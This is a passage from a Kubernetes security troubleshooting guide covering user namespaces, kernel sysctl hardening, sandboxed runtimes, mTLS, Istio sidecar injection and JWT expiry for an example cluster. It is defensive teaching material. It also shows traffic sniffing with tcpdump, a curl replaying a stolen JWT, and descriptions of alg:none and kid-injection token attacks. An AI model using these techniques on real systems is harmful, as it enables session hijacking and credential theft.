  4. Privileged containers can't use user namespaces: hostUsers: false is incompatible with privileged: true. If the pod needs to be privileged (which it shouldn't), user namespaces can't be enabled.
  5. Runtime doesn't support per-pod user namespaces: Some container runtime versions don't support the Kubernetes user namespace feature. The runtime must be updated.
🟣5 New Cluster Causes
  1. User namespace feature not enabled in feature gates: In Kubernetes 1.25-1.29, UserNamespacesStatelessPodSupport=true feature gate must be enabled. Not enabled by default in older versions.
  2. No subordinate UID/GID ranges allocated: Fresh node installation doesn't include /etc/subuid entries. User namespaces can't work without subordinate ID ranges.
  3. No policy requiring hostUsers: false: No admission policy enforces user namespace remapping for user workloads. Pods default to 1:1 UID mapping.
  4. Cluster upgraded but runtime config not updated: Kubernetes upgraded to 1.30+ but containerd config still uses defaults without user namespace support enabled.
  5. User namespaces considered "experimental": Despite being GA in 1.30, teams still view user namespaces as experimental and avoid them in production.
🔍 What to Look At:
kubectl get pods -n anihpj -o json | jq '.items[] | {name, hostUsers: .spec.hostUsers}' Check if hostUsers: false is set. null or true means no user namespace remapping — UIDs map 1:1 to host.
kubectl exec <pod> -- cat /proc/1/uid_map If user namespaces are active, this shows the UID mapping. 0 100000 65536 means container UID 0 maps to host UID 100000. Empty or 0 0 4294967295 means 1:1 mapping.
cat /etc/subuid Run on the NODE. Must have entries for subordinate UID ranges. containerd:100000:65536 allocates 65536 UIDs starting at 100000.
🎯 #1 Root Cause: User namespace remapping is not enabled — container UIDs map 1:1 to host UIDs. If a container process escapes to the host (via any exploit), its UID on the host is the SAME as in the container. Root in container = root on node.
🔧 How to Solve:
1. Configure subordinate UID/GID ranges on each node echo "containerd:100000:65536" >> /etc/subuid echo "containerd:100000:65536" >> /etc/subgid Allocate a range of 65536 UIDs starting at 100000 for container user namespace remapping. Container UID 0 → host UID 100000.
2. Set hostUsers: false in Pod spec spec: hostUsers: false Kubernetes 1.30+ GA feature. Each pod gets its own user namespace. Container UID 0 maps to a high UID on the host — root inside the container is NOT root on the node.
3. Enable in container runtime configuration containerd: ensure config.toml has enable_unprivileged_ports = false and enable_unprivileged_icmp = false under [plugins."io.containerd.grpc.v1.cri"].
4. Fix PV/PVC permissions for remapped UIDs Use fsGroup in securityContext to set the group ownership of volumes. The remapped UID range should have group access to PersistentVolume data.
5. Verify user namespace is active kubectl exec <pod> -- cat /proc/1/uid_map Should show mapping like 0 100000 65536. Confirms container UID 0 is NOT host UID 0.
💡 Personal Advice:
User namespaces are the strongest container isolation available. With hostUsers: false, even if an attacker escapes the container, they're NOT root on the node — they're UID 100000 with zero host privileges. This neutralizes the entire "container escape = node compromise" equation.
Kubernetes 1.30 made this GA. Use it. User namespaces in Kubernetes are no longer experimental. Every pod that doesn't need privileged access or hostPath should have hostUsers: false. It's a game-changer for multi-tenant security.
SH9
🖥️ CATEGORY 3: SYSTEM HARDENING — Issue SH9
Kernel Parameters Not Hardened — sysctl Security Settings Missing

🔍 Symptom: kubectl exec anihpj-api -- cat /proc/sys/net/ipv4/ip_forward returns 1 (enabled). The host's kernel parameters are not hardened. net.ipv4.ip_forward=1 allows the container to forward packets — enabling MITM attacks. kernel.kptr_restrict=0 exposes kernel pointer addresses to unprivileged users, making kernel exploits easier. The node lacks a hardened sysctl configuration (/etc/sysctl.d/99-kubernetes-hardening.conf). These are NODE-LEVEL settings that affect all containers on the node.

  kubectl exec anihpj-api -n anihpj -- cat /proc/sys/net/ipv4/ip_forward
  1   ← IP forwarding enabled — container can route/MITM traffic!

  kubectl exec anihpj-api -n anihpj -- cat /proc/sys/kernel/kptr_restrict
  0   ← Kernel pointers visible to all — easier kernel exploit development!

  ls /etc/sysctl.d/99-kubernetes-hardening.conf   # Run on HOST
  ls: cannot access '/etc/sysctl.d/99-kubernetes-hardening.conf': No such file or directory
🔴5 Most Likely Causes
  1. No hardened sysctl configuration applied to nodes: The host has default sysctl settings — many of which are insecure for container hosts. A hardening config file (/etc/sysctl.d/99-kubernetes-hardening.conf) doesn't exist.
  2. net.ipv4.ip_forward=1 not locked down: IP forwarding allows the container to act as a router. Combined with CAP_NET_ADMIN, the container can intercept and redirect pod-to-pod traffic. Set net.ipv4.ip_forward=0 unless the node is a router.
  3. kernel.kptr_restrict=0 exposes kernel addresses: /proc/kallsyms shows kernel function addresses to unprivileged users. Attackers use this to calculate offsets for kernel exploits. Set kernel.kptr_restrict=2 to hide all addresses.
  4. kernel.dmesg_restrict=0 exposes kernel logs: dmesg is readable by any process — revealing kernel version, loaded modules, and potential vulnerability information. Set kernel.dmesg_restrict=1.
  5. vm.mmap_min_addr=0 allows mapping low memory addresses: This enables NULL pointer dereference exploits. Set vm.mmap_min_addr=65536 to prevent mapping of low memory pages.
🟡5 Less Likely Causes
  1. net.bridge.bridge-nf-call-iptables=0: Without this, iptables rules don't apply to bridged traffic — NetworkPolicy enforcement via iptables FAILS. Set net.bridge.bridge-nf-call-iptables=1. This is the #1 cause of "NetworkPolicy not working."
  2. fs.inotify.max_user_watches too low: Container runtime and kubelet need file watchers. Too low and pods crash with "too many open files." Set to at least 65536.
  3. kernel.unprivileged_userns_clone=1 enabled: Allows non-root users to create user namespaces — a common prerequisite for kernel privilege escalation exploits. Set to 0.
  4. kernel.randomize_va_space=1 (partial ASLR): Full Address Space Layout Randomization should be enabled (=2). Partial ASLR makes memory corruption exploits easier. Set to 2.
  5. fs.protected_hardlinks=0 and fs.protected_symlinks=0: Without these, unprivileged users can create hardlinks and symlinks to files they don't own — enabling TOCTOU (time-of-check-time-of-use) attacks. Set both to 1.
🟣5 New Cluster Causes
  1. Node bootstrap process doesn't include sysctl hardening: Cloud-init, Ansible, or manual node setup doesn't apply any sysctl security configuration. Nodes run with OS defaults.
  2. CIS benchmark sysctl checks not run: Multiple CIS sections (1.7 sysctl checks) test kernel hardening. kube-bench not run on worker nodes.
  3. Cloud provider default AMI/VM image has permissive sysctl: Cloud images prioritize compatibility over security. sysctl settings are not tuned for container workloads.
  4. No sysctl audit or compliance check: No automated validation that node sysctl settings match a security baseline. Drift detection doesn't include kernel parameters.
  5. Node provisioning tool doesn't support sysctl configuration: Infrastructure-as-code (Terraform, CloudFormation) provisions VMs but doesn't configure kernel parameters. Sysctl is always a manual step.
🔍 What to Look At:
sysctl -a | grep -E "ip_forward|kptr_restrict|mmap_min_addr|bridge-nf-call" Run on the NODE. Check key security sysctls. Compare against CIS benchmark recommended values.
cat /etc/sysctl.d/99-kubernetes-hardening.conf Run on the NODE. Should exist with hardened settings for all security-relevant kernel parameters.
kubectl exec <pod> -- cat /proc/sys/net/ipv4/ip_forward While sysctls are node-level, checking from inside a container with hostNetwork reveals which settings are exposed to pods.
🎯 #1 Root Cause: No hardened sysctl configuration (/etc/sysctl.d/99-kubernetes-hardening.conf) is applied to worker nodes. Default kernel parameters allow IP forwarding, expose kernel pointers, permit unprivileged user namespaces, and disable ASLR — all of which make container escape and kernel exploitation easier.
🔧 How to Solve:
1. Create sysctl hardening configuration file on each node cat > /etc/sysctl.d/99-kubernetes-hardening.conf <<EOF net.ipv4.ip_forward=0 kernel.kptr_restrict=2 kernel.dmesg_restrict=1 kernel.unprivileged_userns_clone=0 kernel.randomize_va_space=2 vm.mmap_min_addr=65536 fs.protected_hardlinks=1 fs.protected_symlinks=1 net.bridge.bridge-nf-call-iptables=1 EOF sysctl --system Apply the hardened settings persistently. sysctl --system reloads all sysctl config files.
2. Verify settings are active sysctl net.ipv4.ip_forward kernel.kptr_restrict kernel.dmesg_restrict Each should show the hardened value. ip_forward=0, kptr_restrict=2, dmesg_restrict=1.
3. Include sysctl hardening in node bootstrap Add the 99-kubernetes-hardening.conf file to cloud-init/Ansible/Terraform node provisioning. Every new node gets hardened sysctl automatically.
4. Run CIS benchmark node checks kube-bench run --targets node --check 1.7 CIS section 1.7 covers sysctl hardening. Run on every worker node.
5. Implement sysctl drift detection Regularly audit node sysctl values against the hardened baseline. Alert if any security-critical sysctl has been changed from its hardened value.
💡 Personal Advice:
Node-level kernel hardening is your foundation. Every container security control (capabilities, seccomp, AppArmor) is bypassed if the kernel itself is exploitable. Harden sysctl settings on every node — it's the bottom layer of the security stack and the hardest to retrofit.
net.bridge.bridge-nf-call-iptables=1 is MANDATORY for NetworkPolicy. Without this sysctl, iptables rules don't apply to bridged (pod-to-pod) traffic. Your NetworkPolicies are silently ignored. This is tested in the CKS exam — know this cold.
SH10
🖥️ CATEGORY 3: SYSTEM HARDENING — Issue SH10
Container Runtime Not Sandboxed — No gVisor/Kata/Firecracker Isolation

🔍 Symptom: The anihpj-api container runs under runc — the default containerd runtime which shares the HOST KERNEL with all other containers. If an attacker exploits a kernel vulnerability from inside the container, they compromise EVERY container on the node. kubectl get pods -o json | jq '.items[].spec.runtimeClassName' returns nothing — no sandboxed runtime (gVisor, Kata Containers, Firecracker) is configured. The container has direct syscall access to the shared Linux kernel.

  kubectl get pod anihpj-api -n anihpj -o yaml | grep runtimeClassName
  # No output — using DEFAULT runc runtime (shared kernel)

  kubectl exec anihpj-api -n anihpj -- uname -r
  6.8.0-45-generic   ← SAME kernel as the HOST!

  kubectl get runtimeclass
  No resources found   ← No sandboxed runtime classes configured
🔴5 Most Likely Causes
  1. No sandboxed runtime installed on nodes: gVisor (runsc), Kata Containers, or Firecracker are NOT installed on worker nodes. The default runc runtime is the only option — all containers share the host kernel.
  2. No RuntimeClass resource created in Kubernetes: Even if the runtime binary is installed, no RuntimeClass resource (apiVersion: node.k8s.io/v1, kind: RuntimeClass) exists to reference it. Pods can't request sandboxed execution.
  3. runtimeClassName not set in Pod spec: spec.runtimeClassName: gvisor is not set. All pods use the default runc runtime. The sandboxed runtime is available but unused.
  4. Sandboxed runtime considered "too slow" or "incompatible": gVisor adds a ~5-15% syscall overhead. Teams worried about performance never adopt it. The security-for-performance tradeoff favors speed.
  5. No high-value target identification:
    6. Not all pods need sandboxing — but pods handling untrusted data (user uploads, external API responses) SHOULD be sandboxed. No risk assessment identifies which pods need it.
🟡5 Less Likely Causes
  1. gVisor gofer process requires additional node resources: gVisor's filesystem proxy (gofer) consumes additional memory per pod. Nodes with limited RAM can't support many gVisor pods simultaneously.
  2. Some system calls not implemented in gVisor: gVisor doesn't implement ALL Linux syscalls. Applications using niche syscalls (e.g., perf_event_open, fanotify) may break. Teams hit incompatibilities during testing and abandon gVisor.
  3. No node pool segregation for sandboxed workloads: Sandboxed pods require nodes with gVisor installed. Mixing sandboxed and runc pods on the same node requires runtime awareness — some teams use dedicated node pools instead.
  4. Kata Containers requires nested virtualization: Kata runs each pod in a lightweight VM — requiring KVM or hardware virtualization. Cloud instances without nested virtualization support can't run Kata.
  5. Firecracker microVM overhead not acceptable: Each pod gets its own microVM with a minimal kernel — adding ~5MB memory and 125ms startup overhead. Teams find this unacceptable for bursty, short-lived pods.
🟣5 New Cluster Causes
  1. gVisor/Kata not installed during node bootstrap: Node provisioning (cloud-init, Ansible) doesn't include installing sandboxed runtimes. Nodes only have runc.
  2. No RuntimeClass YAML in infrastructure repo: The RuntimeClass resource was never defined. Kubernetes doesn't know about the sandboxed runtime even if installed.
  3. Container runtime sandboxing not in security roadmap: The team is focused on RBAC, NetworkPolicy, and PSS. Runtime sandboxing is "Phase 2" that never arrives.
  4. Cloud-managed Kubernetes (EKS/AKS/GKE) uses containerd: containerd is the default runtime — runc is the default handler. gVisor must be installed as an ADDITIONAL runtime handler in containerd config.
  5. No admission policy requiring sandboxed runtime for untrusted workloads: No OPA policy checking runtimeClassName for pods in namespaces that handle untrusted data. All pods get the default runc runtime.
🔍 What to Look At:
kubectl get runtimeclass Should list at least one sandboxed runtime (gvisor, kata, firecracker). Empty means all pods share the host kernel.
kubectl get pods -n anihpj -o json | jq '.items[] | {name, runtime: .spec.runtimeClassName}' Check which runtime each pod uses. null means default runc (shared kernel).
kubectl exec <pod> -- uname -r; uname -r Compare kernel version inside container vs host. If they're the SAME, the kernel is shared — no sandboxing. Different = sandboxed.
🎯 #1 Root Cause: No sandboxed container runtime (gVisor/Kata/Firecracker) is deployed. All containers use runc which shares the host Linux kernel. A single kernel exploit in any container compromises every pod on the node and potentially the node itself.
🔧 How to Solve:
1. Install gVisor on worker nodes Download runsc binary and configure containerd to recognize it as an additional runtime handler. Add to /etc/containerd/config.toml: [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runsc] with appropriate options.
2. Create RuntimeClass resource kubectl apply -f - <<EOF apiVersion: node.k8s.io/v1 kind: RuntimeClass metadata: {name: gvisor} handler: runsc EOF This tells Kubernetes how to use the gVisor runtime. Pods can now reference runtimeClassName: gvisor.
3. Assign high-risk pods to sandboxed runtime spec: runtimeClassName: gvisor Add to pods that handle untrusted input: public-facing web servers, file upload handlers, API gateways with external traffic.
4. Test application compatibility Deploy a canary pod with runtimeClassName: gvisor. Monitor for syscall failures and application errors. gVisor blocks io_uring and some fanotify calls by default.
5. Use dedicated sandboxed node pools (cloud) or taints Taint sandbox nodes: kubectl taint nodes <node> sandboxed=gvisor:NoSchedule. Sandboxed pods tolerate the taint and get scheduled on gVisor-enabled nodes. runc pods don't.
💡 Personal Advice:
runc shares the host kernel. That's the fundamental risk. Every container under runc runs syscalls directly on the host kernel. A kernel vulnerability exploited from ANY container compromises the entire node. Sandboxed runtimes (gVisor) intercept syscalls in user space — the app's syscalls never touch the host kernel directly.
Start sandboxing with high-risk workloads first. You don't need to sandbox everything. Start with pods that handle untrusted data: public APIs, file upload handlers, multi-tenant workloads. One sandboxed pod can be the difference between "container compromised" and "entire cluster compromised."

🔗 Category 4: Microservice Vulnerabilities (20 Issues)MV1-MV20

🟢 Microservice Security — mTLS, JWT, API Gateway, Sidecars, Image Hardening

Microservice vulnerabilities arise from unencrypted pod-to-pod communication, mismanaged authentication tokens, exposed debug endpoints, and vulnerable container images. In a distributed system like anihpj/jobpost (web → api → db + redis), every service-to-service call is an attack surface. mTLS must encrypt all inter-pod traffic, JWTs must have short expiry, API gateways must not expose internal endpoints, and images must be free of critical CVEs.

📌 MV1–MV4: mTLS, Sidecar, JWT & API Gateway

MV1
🔗 CATEGORY 4: MICROSERVICE VULNERABILITIES — Issue MV1
Pod-to-Pod Traffic Unencrypted — No mTLS Between Services

🔍 Symptom: kubectl exec anihpj-web -- tcpdump -i eth0 -A port 8000 captures HTTP traffic between anihpj-web and anihpj-api in PLAINTEXT — including JWT tokens, user credentials, and session cookies. No mTLS is configured between services. An attacker who compromises ANY pod on the same node (or gains access to the pod network via a compromised router) can sniff ALL inter-service traffic. Every API call, database query parameter, and authentication token is visible in plaintext.

  kubectl exec anihpj-web -n anihpj -- tcpdump -i eth0 -A port 8000
  GET /api/jobs HTTP/1.1
  Host: anihpj-api:8000
  Authorization: Bearer eyJhbGciOiJSUzI1NiIs...   ← JWT IN PLAINTEXT!
  Cookie: sessionid=abc123def456   ← SESSION IN PLAINTEXT!

  kubectl exec anihpj-web -n anihpj -- curl -v http://anihpj-api:8000/api/users
  * Connected to anihpj-api (10.244.1.5) port 8000   ← PLAIN HTTP, NOT HTTPS!
🔴5 Most Likely Causes
  1. No service mesh deployed (Istio/Linkerd): Without a service mesh, there is NO automatic mTLS between pods. Every service-to-service call is plain HTTP. Istio or Linkerd must be installed to provide transparent mTLS via sidecar proxies.
  2. Service mesh installed but mTLS not enabled: Istio is installed but PeerAuthentication policy is set to PERMISSIVE (not STRICT). The mesh accepts both plaintext and mTLS — attackers can downgrade to plaintext by removing TLS headers.
  3. Applications hardcoded to use HTTP, not HTTPS: Django and PostgreSQL connections use http://anihpj-api:8000 instead of https://anihpj-api:8443. Even with certificates available, the app doesn't use TLS.
  4. No NetworkPolicy restricting pod-to-pod traffic: Without NetworkPolicies, ANY pod can sniff traffic destined for ANY other pod. A compromised web pod can ARP-spoof the API pod's IP and intercept all traffic.
  5. Certificates exist but not distributed to pods: TLS certificates exist in Secrets but are not mounted or referenced by the application. The app serves HTTP on port 8000 — the TLS port 8443 is never configured.
🟡5 Less Likely Causes
  1. mTLS configured but CNI plugin strips TLS headers: Some CNI plugins or network policies inspect and modify traffic. TLS handshake metadata is stripped, causing mTLS negotiation to fail silently — traffic falls back to plaintext.
  2. Certificate rotation breaks mTLS: cert-manager rotated certificates but the new CA is not trusted by all services. mTLS handshakes fail and services fall back to plaintext HTTP as a "degraded mode."
  3. SPIFFE/SPIRE not configured for workload identity: mTLS requires workload identity (X.509 SVIDs from SPIFFE). If SPIFFE is not deployed, services can't obtain identity certificates for mTLS.
  4. Some pods use sidecar mTLS, others don't: Partial migration — anihpj-web has an Istio sidecar but anihpj-api doesn't. Traffic from web→api is plaintext because the api pod has no sidecar to terminate TLS.
  5. mTLS terminates at Ingress, not between pods: The team thinks "we have TLS on the Ingress" means inter-pod traffic is encrypted. Ingress TLS terminates at the edge — pod-to-pod traffic is still plaintext inside the cluster.
🟣5 New Cluster Causes
  1. Service mesh not part of initial cluster setup: kubeadm doesn't install a service mesh. mTLS is opt-in — new clusters have zero pod-to-pod encryption by default.
  2. mTLS considered "too complex" for early stages: Startup teams prioritize feature delivery. Service mesh and mTLS are deferred to "post-launch" — which never arrives.
  3. No security requirement for inter-service encryption: Compliance requirements specify TLS for external traffic but not internal. Internal plaintext is "acceptable" in the threat model — until a pod is compromised.
  4. No monitoring for plaintext traffic: No Falco rule or network monitoring detecting HTTP (non-TLS) traffic between services. Plaintext flows undetected.
  5. Network segmentation assumed to be "enough": Team relies on NetworkPolicy for isolation and assumes pod network is trusted. "Zero-trust networking" principle is not applied inside the cluster.
🔍 What to Look At:
kubectl get pods -n istio-system Check if a service mesh is installed. If the namespace doesn't exist, there's no mTLS infrastructure.
kubectl exec anihpj-web -- curl -v http://anihpj-api:8000/health 2>&1 | grep -E "Connected|SSL" If it says "Connected to anihpj-api" without "SSL connection using," the traffic is plaintext.
kubectl get peerauthentication -A If empty or PERMISSIVE, mTLS is not enforced. Should show STRICT for mesh-wide mTLS enforcement.
🎯 #1 Root Cause: No service mesh (Istio/Linkerd) is deployed, and applications communicate via plain HTTP. Inter-pod traffic — including JWTs, session cookies, and database credentials in API parameters — flows unencrypted across the pod network, visible to any compromised pod or network-level attacker.
🔧 How to Solve:
1. Deploy a service mesh with mTLS istioctl install --set profile=default kubectl label ns anihpj istio-injection=enabled Istio injects Envoy sidecar proxies into every pod. Traffic between sidecars is automatically encrypted with mTLS using SPIFFE identities.
2. Enforce STRICT mTLS mesh-wide kubectl apply -f - <<EOF apiVersion: security.istio.io/v1beta1 kind: PeerAuthentication metadata: {name: default, namespace: istio-system} spec: {mtls: {mode: STRICT}} EOF All service-to-service traffic in the mesh MUST use mTLS. Plaintext connections are rejected.
3. Restart pods to inject sidecars kubectl rollout restart deployment -n anihpj Existing pods need a restart to get the Istio sidecar injected. After restart, all traffic flows through the mTLS tunnel.
4. Verify mTLS is active kubectl exec anihpj-web -c istio-proxy -- curl -v https://anihpj-api:8000 2>&1 | grep "SSL" The Envoy sidecar automatically upgrades HTTP to mTLS. Verify the SSL handshake succeeds.
5. Add NetworkPolicy as defense-in-depth Even with mTLS, restrict which pods can communicate. Only anihpj-web should reach anihpj-api:8000. Only anihpj-api should reach anihpj-db:5432.
💡 Personal Advice:
Ingress TLS ≠ pod-to-pod encryption. TLS on the Ingress only encrypts external→cluster traffic. Inside the cluster, pods communicate via plaintext unless you deploy a service mesh. This is one of the most misunderstood security concepts in Kubernetes.
A service mesh gives you mTLS for free. Istio or Linkerd transparently encrypt ALL pod-to-pod traffic without modifying a single line of application code. The sidecar proxies handle TLS termination, certificate rotation, and identity verification automatically. There's zero excuse for plaintext inter-pod traffic.
MV2
🔗 CATEGORY 4: MICROSERVICE VULNERABILITIES — Issue MV2
Service Mesh Sidecar Not Injected — Pod Communicates in Plaintext

🔍 Symptom: Istio is installed cluster-wide, but kubectl get pods -n anihpj shows READY: 1/1 for anihpj-api — only ONE container. The Istio sidecar (istio-proxy) was NOT injected. The namespace has istio-injection=enabled label, but this specific pod was created BEFORE the label was applied. The pod communicates in plaintext while the rest of the mesh uses mTLS. Other services expecting mTLS from this pod get TLS handshake failures — but the fallback allows plaintext, creating a silent downgrade.

  kubectl get pods -n anihpj -o json | jq '.items[] | {name, containers: [.spec.containers[].name]}'
  { "name": "anihpj-web-7d8f9",   "containers": ["anihpj-web","istio-proxy"] }
  { "name": "anihpj-api-5c3b2",    "containers": ["anihpj-api"] }   ← NO SIDECAR!

  kubectl exec anihpj-api -n anihpj -- curl -v http://anihpj-web:8000
  * Connected to anihpj-web (10.244.2.3) port 8000
  < HTTP/1.1 200 OK   ← PLAINTEXT — sidecar not terminating mTLS!
🔴5 Most Likely Causes
  1. Pod created before namespace label was added: istio-injection=enabled label was applied to the namespace AFTER the pod was created. Istio only injects sidecars during pod CREATION — existing pods must be restarted.
  2. Deployment has sidecar.istio.io/inject: "false" annotation: The pod template has sidecar.istio.io/inject: "false" annotation — explicitly disabling sidecar injection for this Deployment. This is sometimes used for testing and never reverted.
  3. Istio webhook not running or misconfigured: The istiod mutating webhook pod is CrashLoopBackOff. Sidecar injection silently fails — pods are created without sidecars and no error is surfaced.
  4. Custom securityContext blocks sidecar injection: The pod has runAsNonRoot: true and readOnlyRootFilesystem: true but the istio-proxy container requires NET_ADMIN capability. The injection webhook detects incompatibility and skips injection.
  5. Namespace label typo or wrong label key: The namespace has istio-injection: enabled (missing the word "istio-injection" — correct: istio-injection: enabled or istio.io/rev: default) Typo prevents injection.
🟡5 Less Likely Causes
  1. Istio revision mismatch: The namespace is labeled for istio.io/rev: 1-18 but the control plane is running revision 1-19. Sidecar injection targets the wrong Istio version and fails.
  2. Pod uses hostNetwork: true: Istio does NOT inject sidecars into hostNetwork pods. The pod is excluded from the mesh — all traffic is plaintext and bypasses mTLS.
  3. Pod is a Job or CronJob: Istio can inject into Jobs but requires explicit configuration. If not configured, the Job pod has no sidecar and communicates in plaintext.
  4. Resource quota prevents sidecar: The namespace has a resource quota that would be exceeded by the additional istio-proxy container. The injection webhook skips injection to avoid quota violation.
  5. Istio CNI plugin not installed: Istio CNI handles network redirection without requiring elevated privileges. If the CNI plugin is missing, the init container that configures iptables never runs — sidecar is injected but traffic bypasses it.
🟣5 New Cluster Causes
  1. Deployments created before Istio installation: All pods predate the service mesh. No one restarted them after Istio was deployed — they're running without sidecars indefinitely.
  2. Selective namespace labeling not completed: Only some namespaces have injection enabled. The anihpj namespace was missed or intentionally excluded during initial setup.
  3. No post-mesh verification: After Istio installation, no one checked that ALL pods have sidecars. The assumption was "we deployed Istio → we have mTLS."
  4. No admission policy ensuring sidecar presence: No OPA/Gatekeeper policy that requires the istio-proxy container to be present in pods within labeled namespaces.
  5. Team doesn't understand sidecar injection is at creation time: The common misconception: "I labeled the namespace → all pods magically get sidecars." Restart is required but overlooked.
🔍 What to Look At:
kubectl get pods -n anihpj -o json | jq '.items[] | {name, containers: [.spec.containers[].name]}' Check READY count: 1/1 means missing sidecar. 2/2 means injected. Any pod with 1/1 in a labeled namespace is a plaintext vulnerability.
kubectl get ns anihpj -o yaml | grep istio Verify the injection label is correct and present on the namespace.
kubectl rollout restart deployment -n anihpj Restart all deployments to trigger sidecar injection. After restart, verify READY count is 2/2 for all pods.
🎯 #1 Root Cause: Pods were created BEFORE the istio-injection=enabled namespace label was applied. Istio sidecar injection only occurs at POD CREATION time — existing pods must be restarted (via rollout restart) to receive the Envoy sidecar proxy.
🔧 How to Solve:
1. Restart all deployments in the namespace kubectl rollout restart deployment -n anihpj This terminates old pods and creates new ones. The Istio mutating webhook injects the sidecar during creation of the new pods.
2. Verify sidecar injection kubectl get pods -n anihpj All pods should show READY: 2/2 — the application container + istio-proxy sidecar.
3. Check for injection-disabling annotations kubectl get deployment -n anihpj -o yaml | grep "sidecar.istio.io/inject" Remove any sidecar.istio.io/inject: "false" annotations from Deployments that should be in the mesh.
4. Add OPA policy enforcing sidecar presence In labeled namespaces, reject pods that don't have the istio-proxy container (except for known exemptions like Jobs). This prevents future sidecar-less pods.
5. Monitor sidecar health Set up a Prometheus alert: if any pod in a labeled namespace has READY < 2/2 for more than 5 minutes, alert the ops team. This catches injection failures early.
💡 Personal Advice:
Labeling a namespace does NOT inject sidecars into existing pods. Sidecar injection happens during pod CREATION — via the mutating webhook. Labeling the namespace and forgetting to restart pods is the #1 reason why "we have a service mesh" but half the pods communicate in plaintext.
Use 2/2 as your health indicator. If a pod in a mesh-enabled namespace shows READY: 1/1, it has NO sidecar and NO mTLS. Make this a hard monitoring alert. No exceptions.
MV3
🔗 CATEGORY 4: MICROSERVICE VULNERABILITIES — Issue MV3
JWT Token Without Expiry — Permanent Session Hijacking

🔍 Symptom: The anihpj-api issues JWT access tokens with NO exp (expiration) claim. jwt-decode <token> shows the JWT payload has "sub": "user-123" but no "exp" field. Once issued, the token NEVER expires — it's valid forever. An attacker who steals a JWT (via XSS, log leak, or network sniffing) has PERMANENT access to the API as that user. Even if the user changes their password, the stolen JWT remains valid indefinitely.

  echo "eyJhbG...<token>" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
  {
    "sub": "user-123",
    "iat": 1718000000,
    "iss": "anihpj-api"
    # NO "exp" CLAIM!   ← Token NEVER expires!
  }

  curl -H "Authorization: Bearer <STOLEN_JWT>" https://anihpj.jobpost.com/api/jobs
  {"jobs": [...]}   ← STILL VALID — 6 months after issue!
🔴5 Most Likely Causes
  1. JWT library configured without expiration: The JWT signing code omits the exp claim. In Django: jwt.encode(payload, key, algorithm='HS256') — the payload has no 'exp': datetime.utcnow() + timedelta(hours=1). The library defaults to "no expiry."
  2. Refresh tokens also lack expiry: Even if access tokens expire, long-lived refresh tokens have no expiry. An attacker with a stolen refresh token can generate new access tokens forever.
  3. No token revocation mechanism: There's no JWT blacklist or revocation list. Once a JWT is issued, the only way to invalidate it is to change the signing key — which invalidates ALL tokens for ALL users.
  4. JWT signed with weak symmetric secret: HS256 uses a shared secret. If the secret is weak or leaked, attackers can FORGE valid JWTs with any claims, any user, and no expiry. The API server can't distinguish forged tokens from real ones.
  5. No JWT audience (aud) or issuer (iss) validation: The API server accepts ANY validly-signed JWT regardless of who issued it. A JWT issued for a different service works on the anihpj API — cross-service token reuse attack.
🟡5 Less Likely Causes
  1. JWT stored in localStorage (XSS vulnerable): The frontend stores the JWT in localStorage, which is accessible to ANY JavaScript on the page. An XSS vulnerability in the job board frontend exfiltrates every user's JWT.
  2. JWT passed in URL query parameters: GET /api/jobs?token=eyJhbG... — the JWT appears in server logs, browser history, and Referer headers sent to third-party analytics. The token leaks everywhere.
  3. No binding between JWT and client: The JWT has no jti (JWT ID) or fingerprint claim. The token can be used from ANY IP, ANY user-agent — perfect for replay attacks after theft.
  4. Algorithm confusion attack: The server accepts JWTs signed with none algorithm or allows algorithm switching. An attacker changes "alg": "RS256" to "alg": "none" — the server accepts the token without verifying any signature.
  5. JWT kid (Key ID) injection: The server trusts the kid header to locate the signing key. An attacker can manipulate kid to point to a file containing a predictable value — effectively signing tokens with a known key.
🟣5 New Cluster Causes
  1. JWT signing key generated once and never rotated: The HS256 secret was created during initial development and never changed. If the secret was ever committed to Git (even privately), all tokens ever issued are forgeable.
  2. No JWT validation library with secure defaults: The team implemented JWT validation manually or used a library without understanding the security implications. No "secure by default" JWT middleware.
  3. No token lifecycle policy: No documented standard for JWT expiry duration, refresh token rotation, or signing key rotation frequency.
  4. JWT used for both auth and session persistence: The JWT is the ONLY session mechanism. No server-side session tracking or token usage monitoring — impossible to detect token theft.
  5. No rate limiting on token usage: A stolen token can be used to make unlimited API requests. No anomaly detection flags unusual token usage patterns (different IPs, rapid requests).
🔍 What to Look At:
echo <JWT> | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .exp Check if the JWT has an exp claim. null means the token NEVER expires. The exp should be a Unix timestamp in the near future.
echo <JWT> | cut -d'.' -f1 | base64 -d 2>/dev/null | jq .alg Verify the algorithm. Should be RS256 or ES256 (asymmetric). HS256 uses a shared secret — harder to rotate, easier to leak. none is a critical vulnerability.
curl -H "Authorization: Bearer <OLD_TOKEN>" https://api/health Test a known old token. If it returns 200, there's no expiry enforcement.
🎯 #1 Root Cause: The JWT is created without an exp (expiration) claim. Once issued, the token remains valid FOREVER. Combined with no token revocation mechanism (blacklist), a stolen JWT grants permanent, undetectable API access as the compromised user.
🔧 How to Solve:
1. Add short expiration to access tokens Set exp to 15-60 minutes: payload['exp'] = datetime.utcnow() + timedelta(minutes=15). Short-lived tokens limit the window of opportunity after theft.
2. Implement refresh token rotation Issue a refresh token alongside the access token. When the access token expires, use the refresh token to get a NEW access token AND a NEW refresh token. Old refresh tokens are invalidated (rotation).
3. Add jti (JWT ID) and maintain a token blacklist Each JWT gets a unique jti claim. On logout or token revocation, add the jti to a Redis blacklist with TTL matching the token's remaining lifetime. The API checks every JWT against the blacklist.
4. Use asymmetric signing (RS256/ES256) Replace HS256 with RS256. The private key stays on the auth server — only the public key is distributed to API servers for verification. Private key compromise doesn't happen via config leak.
5. Validate all JWT claims server-side Always validate: exp (not expired), nbf (not before), iss (expected issuer), aud (intended audience), alg (expected algorithm — reject none). Never trust the JWT header blindly.
💡 Personal Advice:
No expiry = no security. Period. A JWT without exp is a permanent session token. It's equivalent to a password that never changes and can't be revoked. Always set exp to the shortest practical duration — 15 minutes for access tokens, 24 hours for refresh tokens.
Token rotation plugs the leak. With refresh token rotation, a stolen refresh token is only useful ONCE. When the attacker uses it, the legitimate user's next refresh fails — alerting them (and you) that the token was compromised. This is the gold standard for JWT security.
MV4
🔗 CATEGORY 4: MICROSERVICE VULNERABILITIES — Issue MV4
API Gateway Exposes Internal Service Endpoints — Backend Leak

